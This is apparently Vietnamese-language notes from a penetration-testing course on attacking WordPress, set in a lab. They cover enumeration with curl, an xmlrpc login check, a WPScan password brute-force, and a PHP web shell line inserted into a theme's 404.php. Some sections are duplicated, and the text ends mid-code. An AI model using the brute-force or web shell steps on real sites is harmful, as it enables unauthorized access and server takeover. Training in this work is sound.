# Hacking WordPress

## WordPress Overview
WordPress là hệ thống quản lý nội dung (Content Management System - CMS) mã nguồn mở phổ biến nhất, cung cấp năng lực vận hành. Nền tảng này có thể được ứng dụng cho nhiều mục đích khác nhau như lưu trữ blog, diễn đànm thương mại điện tử, quản lý dự án, quản lý tài liệu, và v.v. WordPress có khả năng tuỳ biến cao cùng với tính thân thiện với công cụ tìm kiếm (SEO friendly), điều này khiến nó trở nên phổ biến trong các doanh nghiệp. Hệ thống sở hữu một thư viện mở rộng lớn các tiện ích được gọi là themes và plugins. Một số ví dụ về plugins bao gồm: WPForms - một công cụ tạo biểu mẫu liên hệ mạnh mẽ, MonsterInsights có khả năng tích hợp với Google Analytics, và Constant Contact - một dịch vụ email marketing phổ biến. Tuy nhiên, tính tùy biến và khả năng mở rộng của WordPress cũng khiến nó dễ bị tổn thương (vulnerable) thông qua các themes và plugins của bên thứ ba. WordPress được phát triển bằng ngôn ngữ PHP và thường chạy trên máy chủ Apache với MySQL làm cơ sở dữ liệu backend. Nhiều công ty cung cấp dịch vụ hosting đưa ra WordPress như một lựa chọn khi tạo website mới và thậm chí hỗ trợ các tác vụ backend như cập nhật bảo mật.

### CMS - Content Management System
CMS là một công cụ mạnh mẽ hỗ trợ xây dụng website mà không cần phải lập trình mọi thứ từ đầu. CMS thực hiện phần lớn "công việc nặng nhọc" về mặt hạ tầng để người dùng có thể tập trung nhiều hơn vào các khía cạnh thiết kế và trình bày website thay vì cấu trúc backend. Hầu hết các CMS cung cấp trình soạn thảo WYSIWYG (What You See Is What You Get - Những gì bạn thấy là những gì bạn nhận được) phong phú, trong đó người dùng có thể chỉnh sửa nội dung như thể họ đang làm việc với một công cụ xử lý văn bản như Microsoft Word. 

- Một CMS được cấu tạo từ hai thành phần chính:
+ Content Management Application (CMA) - giao diện được sử dụng để thêm và quản lý nội dung.
+ Content Delivery Application (CDA) - backend nhận đầu vào được nhập vào CMS và tổng hợp code thành một website hoạt động và hấp dẫn về mặt trực quan.

Một CMS tốt sẽ cung cấp khả năng mở rộng (extensibility), cho phép thêm chức năng và các yếu tố thiết kế vào trang web mà không cần làm việc với mã nguồn website, quản lý người dùng phong phú để cung cấp kiểm soát chi tiết về quyền truy cập (access permissions) và vai trò (roles), quản lý media cho phép người dùng dễ dàng tải lên và nhúng ảnh cũng như video, và kiểm soát phiên bản (version control) phù hợp. Khi tìm kiếm một CMS, chúng ta cũng nên xác nhận rằng nó được bảo trì tốt, nhận được các cập nhật và nâng cấp định kỳ, và có đủ cài đặt bảo mật tích hợp sẵn để củng cố (harden) website trước các kẻ tấn công.

### WordPress Structure

WordPress có thể được cài đặt trên các hệ điều hành Windows, Linux, hoặc MacOSX. WordPress yêu cầu một LAMP stack (hệ điều hành Linux, Máy chủ HTTP Apache, cơ sở dữ liệu MySQL, và ngôn ngữ lập trình PHP) được cài đặt và cấu hình đầy đủ trước khi cài đặt trên host Linux. Sau khi cài đặt, tất cả các tệp và thư mục hỗ trợ WordPress sẽ có thể truy cập được trong thư mục gốc web (webroot) nằm tại /var/www/html.

Dưới đây là cấu trúc thư mục của một bản cài đặt WordPress mặc định, hiển thị các tệp và thư mục con chính cần thiết để website hoạt động đúng cách.

**File Structure**

```bash
23senku@htb[/htb]$ tree -L 1 /var/www/html
.
├── index.php
├── license.txt
├── readme.html
├── wp-activate.php
├── wp-admin
├── wp-blog-header.php
├── wp-comments-post.php
├── wp-config.php
├── wp-config-sample.php
├── wp-content
├── wp-cron.php
├── wp-includes
├── wp-links-opml.php
├── wp-load.php
├── wp-login.php
├── wp-mail.php
├── wp-settings.php
├── wp-signup.php
├── wp-trackback.php
└── xmlrpc.php
```

**Key WordPress Files**

Thư mục gốc (root directory) của của WordPress chứa các tệp cần thiết để cấu hình WordPress hoạt động chính xác.
- index.php: Trang chủ của WordPress.
- license.txt: chứa thông tin hữu ích như phiên bản WordPress đã được cài đặt.
- wp-activate.php: được sử dụng cho quy trình kích hoạt email khi thiết lập một trang WordPress mới.
- wp-admin: Thư mục wp-admin chứa trang đăng nhập dành cho quyền truy cập quản trị (administrator) và bảng điều khiển backend. Sau khi người dùng đăng nhập, họ có thể thực hiện các thay đổi đối với trang web dựa trên quyền hạn (permissions) được gán cho họ. Trang đăng nhập có thể được định vị tại một trong các đường dẫn sau:
    - /wp-admin/login.php
    - /wp-admin/wp-login.php
    - /login.php
    - /wp-login.php
Tệp này cũng có thể được đổi tên để tăng độ khó trong việc tìm kiếm trang đăng nhập.
- `xmlrpc.php` là một tệp đại diện cho tính năng của WordPress cho phép truyền dữ liệu với HTTP đóng vai trò là cơ chế vận chuyển (transport mechanism) và XML làm cơ chế mã hóa (encoding mechanism). Loại hình truyền thông này đã được thay thế bởi WordPress REST API.

#### WordPress Configuration File

Tệp `wp-config.php` chứa thông tin được yêu cầu bởi WordPress để kết nối với cơ sở dữ liệu, chẳng hạn như tên cơ sở dữ liệu (database name), máy chủ cơ sở dữ liệu (database host), tên người dùng và mật khẩu, các khóa xác thực và salts (authentication keys and salts), cùng với tiền tố bảng cơ sở dữ liệu (database table prefix). Tệp cấu hình này cũng có thể được sử dụng để kích hoạt chế độ DEBUG, công cụ hữu ích trong việc khắc phục sự cố (troubleshooting).

**wp-config.php**

```php
<?php
/** <SNIP> */
/** The name of the database for WordPress */
define( 'DB_NAME', 'database_name_here' );

/** MySQL database username */
define( 'DB_USER', 'username_here' );

/** MySQL database password */
define( 'DB_PASSWORD', 'password_here' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Authentication Unique Keys and Salts */
/* <SNIP> */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/** WordPress Database Table prefix */
$table_prefix = 'wp_';

/** For developers: WordPress debugging mode. */
/** <SNIP> */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

Thư mục `wp-content` là thư mục chính nơi các plugins và themes được lưu trữ. Thư mục con `uploads/` thường là nơi lưu trữ bất kỳ tệp nào được tải lên nền tảng. Các thư mục và tệp này cần được liệt kê (enumerate) cẩn thận vì chúng có thể chứa dữ liệu nhạy cảm dẫn đến việc thực thi mã từ xa (remote code execution) hoặc khai thác các lỗ hổng bảo mật hoặc cấu hình sai (misconfigurations) khác.

**WP-Content**

```bash
23senku@htb[/htb]$ tree -L 1 /var/www/html/wp-content
.
├── index.php
├── plugins
└── themes
```

Thư mục `wp-includes` chứa mọi thứ ngoại trừ các thành phần quản trị (administrative components) và các themes thuộc về website. Đây là thư mục nơi các tệp lõi (core files) được lưu trữ, chẳng hạn như chứng chỉ (certificates), phông chữ (fonts), tệp JavaScript, và các widgets.

**WP-Includes**

```bash
23senku@htb[/htb]$ tree -L 1 /var/www/html/wp-includes
.
├── <SNIP>
├── theme.php
├── update.php
├── user.php
├── vars.php
├── version.php
├── widgets
├── widgets.php
├── wlwmanifest.xml
├── wp-db.php
└── wp-diff.php
```

### WordPress User Roles

Có năm loại người dùng trong một bản cài đặt WordPress tiêu chuẩn.

| Role | Description |
|----------------|---------------------|
| **Administrator** | Người dùng này có quyền truy cập vào các tính năng quản trị trong website. Điều này bao gồm thêm và xóa người dùng và bài viết, cũng như chỉnh sửa mã nguồn (source code). |
| **Editor** | Biên tập viên có thể xuất bản và quản lý bài viết, bao gồm cả các bài viết của người dùng khác. |
| **Author** | Tác giả có thể xuất bản và quản lý bài viết của chính họ. |
| **Contributor** | Những người dùng này có thể viết và quản lý bài viết của riêng họ nhưng không thể xuất bản chúng. |
| **Subscriber** | Đây là những người dùng thông thường có thể duyệt bài viết và chỉnh sửa hồ sơ (profile) của họ. |

Việc giành được quyền truy cập với vai trò quản trị viên (administrator) thường là cần thiết để có được khả năng thực thi mã (code execution) trên máy chủ. Tuy nhiên, các biên tập viên (editors) và tác giả (authors) có thể có quyền truy cập vào một số plugins dễ bị tổn thương (vulnerable plugins) mà người dùng thông thường không có.

### WordPress Core Version Enumeration

Luôn luôn quan trọng để biết loại ứng dụng mà chúng ta đang làm việc. Một phần thiết yếu của giai đoạn enumeration là phát hiện số phiên bản phần mềm. Điều này hữu ích khi tìm kiếm các cấu hình sai phổ biến như mật khẩu mặc định có thể được đặt cho các phiên bản nhất định của ứng dụng và tìm kiếm các lỗ hổng đã biết cho một số phiên bản cụ thể. Chúng ta có thể sử dụng nhiều phương pháp khác nhau để khám phá số phiên bản theo cách thủ công. Bước đầu tiên và dễ nhất là xem xét mã nguồn trang (page source code). Chúng ta có thể thực hiện điều này bằng cách nhấp chuột phải vào bất kỳ đâu trên trang hiện tại và chọn "View page source" từ menu hoặc sử dụng phím tắt [CTRL + U].

Chúng ta có thể tìm kiếm thẻ meta generator bằng cách sử dụng phím tắt [CTRL + F] trong trình duyệt hoặc sử dụng cURL cùng với grep từ dòng lệnh để lọc thông tin này.

**WP Version - Source Code**

```html
...SNIP...
<link rel='https://api.w.org/' href='http://blog.inlanefreight.com/index.php/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://blog.inlanefreight.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://blog.inlanefreight.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.3.3" />
...SNIP...
```

```bash
23senku@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'

<meta name="generator" content="WordPress 5.3.3" />
```

Ngoài thông tin phiên bản, mã nguồn cũng có thể chứa các comments có thể hữu ích. Các liên kết đến CSS (style sheets) và JS (JavaScript) cũng có thể cung cấp manh mối về số phiên bản.

**WP Version - CSS**

```html
...SNIP...
<link rel='stylesheet' id='bootstrap-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='transportex-style-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/style.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='transportex_color-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/colors/default.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='smartmenus-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/jquery.smartmenus.bootstrap.css?ver=5.3.3' type='text/css' media='all' />
...SNIP...
```

**WP Version - JS**

```html
...SNIP...
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.3.3'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.3.3'></script>
...SNIP...
```

Trong các phiên bản WordPress cũ hơn, một nguồn khác để phát hiện thông tin phiên bản là tệp `readme.html` trong thư mục gốc của WordPress.

### Plugins and Themes Enumeration

Chúng ta cũng có thể tìm thấy thông tin về các plugins đã cài đặt bằng cách xem xét mã nguồn theo cách thủ công thông qua việc kiểm tra source code của trang hoặc lọc thông tin bằng cách sử dụng cURL và các tiện ích dòng lệnh khác.

**Plugins**

```bash
23senku@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2

http://blog.inlanefreight.com/wp-content/plugins/wp-google-places-review-slider/public/css/wprev-public_combine.css?ver=6.1
http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/plugins/wp-google-places-review-slider/public/js/wprev-public-com-min.js?ver=6.1
http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/css/mm_frontend.css?ver=5.3.3
```

**Themes**

```bash
23senku@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2

http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/style.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/colors/default.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/jquery.smartmenus.bootstrap.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/owl.carousel.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/owl.transitions.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/font-awesome.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/animate.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/magnific-popup.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap-progressbar.min.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/navigation.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/bootstrap.min.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/jquery.smartmenus.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/jquery.smartmenus.bootstrap.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/owl.carousel.min.js?ver=5.3.3
background: url("http://blog.inlanefreight.com/wp-content/themes/ben_theme/images/breadcrumb-back.jpg") #50b9ce;
```

Các response headers cũng có thể chứa số phiên bản cho các plugins cụ thể.

Tuy nhiên, không phải tất cả các plugins và themes đã cài đặt đều có thể được phát hiện một cách passive. Trong trường hợp này, chúng ta phải gửi các requests đến máy chủ một cách active để enumerate chúng. Chúng ta có thể thực hiện điều này bằng cách gửi một GET request trỏ đến một thư mục hoặc tệp có thể tồn tại trên máy chủ. Nếu thư mục hoặc tệp đó tồn tại, chúng ta sẽ có quyền truy cập vào thư mục hoặc tệp đó hoặc sẽ nhận được một redirect response từ webserver, cho biết rằng nội dung đó thực sự tồn tại. Tuy nhiên, chúng ta không có quyền truy cập trực tiếp vào nó.

**Plugins Active Enumeration**

```bash
23senku@htb[/htb]$ curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta

HTTP/1.1 301 Moved Permanently
Date: Wed, 13 May 2020 20:08:23 GMT
Server: Apache/2.4.29 (Ubuntu)
Location: http://blog.inlanefreight.com/wp-content/plugins/mail-masta/
Content-Length: 356
Content-Type: text/html; charset=iso-8859-1
```

Nếu nội dung không tồn tại, chúng ta sẽ nhận được lỗi **404 Not Found**.

```bash
23senku@htb[/htb]$ curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/someplugin

HTTP/1.1 404 Not Found
Date: Wed, 13 May 2020 20:08:18 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Link: <http://blog.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/"
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
```

Điều tương tự cũng áp dụng cho các themes đã cài đặt.

Để tăng tốc quá trình enumeration, chúng ta cũng có thể viết một bash script đơn giản hoặc sử dụng một công cụ như **wfuzz** hoặc **WPScan**, công cụ tự động hóa quá trình này.

### Directory Indexing

Các active plugins không nên là khu vực duy nhất mà chúng ta tập trung khi đánh giá một website WordPress. Ngay cả khi một plugin đã bị deactivated, nó vẫn có thể được truy cập, và do đó chúng ta có thể giành quyền truy cập vào các scripts và functions liên quan của nó. Việc deactivate một vulnerable plugin không cải thiện tính bảo mật của trang WordPress. Best practice là gỡ bỏ hoặc cập nhật thường xuyên bất kỳ plugins không sử dụng nào.

### Login

Sau khi được trang bị danh sách valid users, chúng ta có thể thực hiện cuộc tấn công password brute-forcing để cố gắng giành quyền truy cập vào WordPress backend. Cuộc tấn công này có thể được thực hiện thông qua trang login hoặc trang `xmlrpc.php`.

Nếu POST request của chúng ta đối với `xmlrpc.php` chứa valid credentials, chúng ta sẽ nhận được đầu ra sau:

**cURL - POST Request**

```bash
23senku@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><struct>
  <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
  <member><name>url</name><value><string>http://blog.inlanefreight.com/</string></value></member>
  <member><name>blogid</name><value><string>1</string></value></member>
  <member><name>blogName</name><value><string>Inlanefreight</string></value></member>
  <member><name>xmlrpc</name><value><string>http://blog.inlanefreight.com/xmlrpc.php</string></value></member>
</struct></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

Nếu credentials không hợp lệ, chúng ta sẽ nhận được lỗi **403 faultCode**.

**Invalid Credentials - 403 Forbidden**

```bash
23senku@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>asdasd</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>403</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string>Incorrect username or password.</string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```

Các phần vừa qua đã giới thiệu một số phương pháp để thực hiện manual enumeration đối với một phiên bản WordPress. Việc hiểu các phương pháp manual là điều cần thiết trước khi cố gắng sử dụng các automated tools. Mặc dù các automated tools tăng tốc đáng kể quá trình penetration testing, nhưng chúng ta có trách nhiệm hiểu tác động của chúng đối với các hệ thống mà chúng ta đang đánh giá. Hiểu biết vững chắc về các phương pháp manual enumeration cũng sẽ hỗ trợ việc troubleshooting trong trường hợp bất kỳ automated tools nào không hoạt động đúng cách hoặc cung cấp đầu ra không mong đợi.

### WordPress Core Version Enumeration
Luôn luôn quan trọng để biết loại ứng dụng mà chúng ta đang làm việc. Một phần thiết yếu của giai đoạn liệt kê (enumeration phase) là phát hiện số phiên bản phần mềm. Điều này hữu ích khi tìm kiếm các cấu hình sai phổ biến như mật khẩu mặc định có thể được đặt cho các phiên bản nhất định của ứng dụng và tìm kiếm các lỗ hổng đã biết cho một số phiên bản cụ thể. Chúng ta có thể sử dụng nhiều phương pháp khác nhau để khám phá số phiên bản theo cách thủ công. Bước đầu tiên và dễ nhất là xem xét mã nguồn trang (page source code). Chúng ta có thể thực hiện điều này bằng cách nhấp chuột phải vào bất kỳ đâu trên trang hiện tại và chọn "View page source" từ menu hoặc sử dụng phím tắt [CTRL + U].

Chúng ta có thể tìm kiếm thẻ meta generator bằng cách sử dụng phím tắt [CTRL + F] trong trình duyệt hoặc sử dụng cURL cùng với grep từ dòng lệnh để lọc thông tin này.

**WP Version - Source Code**
```html
...SNIP...
<link rel='https://api.w.org/' href='http://blog.inlanefreight.com/index.php/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://blog.inlanefreight.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://blog.inlanefreight.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.3.3" />
...SNIP...
```
  WordPress Core Version Enumeration
```bash
23senku@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'
<meta name="generator" content="WordPress 5.3.3" />
```
Ngoài thông tin phiên bản, mã nguồn cũng có thể chứa các chú thích (comments) có thể hữu ích. Các liên kết đến CSS (style sheets) và JS (JavaScript) cũng có thể cung cấp manh mối về số phiên bản.

**WP Version - CSS**
```html
...SNIP...
<link rel='stylesheet' id='bootstrap-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='transportex-style-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/style.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='transportex_color-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/colors/default.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='smartmenus-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/jquery.smartmenus.bootstrap.css?ver=5.3.3' type='text/css' media='all' />
...SNIP...
```
**WP Version - JS**
```html
...SNIP...
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.3.3'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.3.3'></script>
...SNIP...
```
Trong các phiên bản WordPress cũ hơn, một nguồn khác để phát hiện thông tin phiên bản là tệp readme.html trong thư mục gốc của WordPress.

### Plugins and Themes Enumeration
Chúng ta cũng có thể tìm thấy thông tin về các plugins đã cài đặt bằng cách xem xét mã nguồn theo cách thủ công thông qua việc kiểm tra source code của trang hoặc lọc thông tin bằng cách sử dụng cURL và các tiện ích dòng lệnh khác.

**Plugins and Themes Enumeration**
```bash
23senku@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2

http://blog.inlanefreight.com/wp-content/plugins/wp-google-places-review-slider/public/css/wprev-public_combine.css?ver=6.1
http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/plugins/wp-google-places-review-slider/public/js/wprev-public-com-min.js?ver=6.1
http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/css/mm_frontend.css?ver=5.3.3
```

**Themes**  
Plugins and Themes Enumeration
```bash
23senku@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2

http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/style.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/colors/default.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/jquery.smartmenus.bootstrap.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/owl.carousel.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/owl.transitions.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/font-awesome.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/animate.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/magnific-popup.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap-progressbar.min.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/navigation.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/bootstrap.min.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/jquery.smartmenus.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/jquery.smartmenus.bootstrap.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/owl.carousel.min.js?ver=5.3.3
background: url("http://blog.inlanefreight.com/wp-content/themes/ben_theme/images/breadcrumb-back.jpg") #50b9ce;
```
Các response headers cũng có thể chứa số phiên bản cho các plugins cụ thể.

Tuy nhiên, không phải tất cả các plugins và themes đã cài đặt đều có thể được phát hiện một cách thụ động (passively). Trong trường hợp này, chúng ta phải gửi các yêu cầu đến máy chủ một cách chủ động (actively) để liệt kê chúng. Chúng ta có thể thực hiện điều này bằng cách gửi một yêu cầu GET trỏ đến một thư mục hoặc tệp có thể tồn tại trên máy chủ. Nếu thư mục hoặc tệp đó tồn tại, chúng ta sẽ có quyền truy cập vào thư mục hoặc tệp đó hoặc sẽ nhận được một phản hồi chuyển hướng (redirect response) từ máy chủ web, cho biết rằng nội dung đó thực sự tồn tại. Tuy nhiên, chúng ta không có quyền truy cập trực tiếp vào nó.

**Plugins Active Enumeration**
**Plugins and Themes Enumeration**

```bash
23senku@htb[/htb]$ curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta

HTTP/1.1 301 Moved Permanently
Date: Wed, 13 May 2020 20:08:23 GMT
Server: Apache/2.4.29 (Ubuntu)
Location: http://blog.inlanefreight.com/wp-content/plugins/mail-masta/
Content-Length: 356
Content-Type: text/html; charset=iso-8859-1
```

Nếu nội dung không tồn tại, chúng ta sẽ nhận được lỗi 404 Not Found.

**Plugins and Themes Enumeration**

```bash
23senku@htb[/htb]$ curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/someplugin

HTTP/1.1 404 Not Found
Date: Wed, 13 May 2020 20:08:18 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Link: <http://blog.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/"
Transfer-Encoding: chunked 
Content-Type: text/html; charset=UTF-8
```

Điều tương tự cũng áp dụng cho các themes đã cài đặt.

Để tăng tốc quá trình enumeration, chúng ta cũng có thể viết một bash script đơn giản hoặc sử dụng một công cụ như **wfuzz** hoặc **WPScan**, công cụ tự động hóa quá trình này.

## Attacking WordPress Users

### WordPress User Bruteforce

WPScan có thể được sử dụng để brute force usernames và passwords. Báo cáo quét trả về ba users đã đăng ký trên website: admin, roger, và david. Công cụ này sử dụng hai loại login brute force attacks, **xmlrpc** và **wp-login**. Method **wp-login** sẽ cố gắng brute force trang đăng nhập WordPress thông thường, trong khi method **xmlrpc** sử dụng WordPress API để thực hiện các login attempts thông qua `/xmlrpc.php`. Method **xmlrpc** được ưu tiên hơn vì nó nhanh hơn.

**WPScan - XMLRPC**

```bash
23senku@htb[/htb]$ wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com

[+] URL: http://blog.inlanefreight.com/                                                  
[+] Started: Thu Apr  9 13:37:36 2020                                                                                                                                               
[+] Performing password attack on Xmlrpc against 3 user/s

[SUCCESS] - admin / sunshine1
Trying david / Spring2016 Time: 00:00:01 <============> (474 / 474) 100.00% Time: 00:00:01

[i] Valid Combinations Found:
 | Username: admin, Password: sunshine1
```

## Tấn Công WordPress Backend

### Remote Code Execution (RCE) qua Theme Editor

Khi đã có quyền truy cập quản trị (administrative access) vào WordPress, chúng ta có thể chỉnh sửa mã nguồn PHP để thực thi các lệnh hệ thống (system commands). Để thực hiện cuộc tấn công này, hãy đăng nhập vào WordPress với thông tin đăng nhập quản trị viên (administrator credentials), sau đó sẽ được chuyển hướng đến bảng điều khiển quản trị (admin panel). 

#### Truy Cập Theme Editor

Nhấp vào **Appearance** (Giao diện) trên bảng điều khiển bên và chọn **Theme Editor** (Trình chỉnh sửa giao diện). Trang này cho phép chúng ta chỉnh sửa trực tiếp mã nguồn PHP. Chúng ta nên chọn một theme không hoạt động (inactive theme) để tránh làm hỏng theme chính.

**Lưu ý quan trọng**: Nếu theme đang hoạt động là Transportex, thì nên chọn một theme không sử dụng như **Twenty Seventeen**.

#### Các Bước Thực Hiện

1. **Chọn Theme**: Chọn một theme không hoạt động và nhấp vào **Select**
2. **Chọn File**: Chọn một file không quan trọng như `404.php` để chỉnh sửa và thêm web shell
3. **Chèn Mã Độc**: Thêm đoạn code sau vào đầu file `404.php`:

**Ví dụ - 404.php của Twenty Seventeen Theme**

```php
<?php

system($_GET['cmd']);

/**
 * The template for displaying 404 pages (not found)
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
```

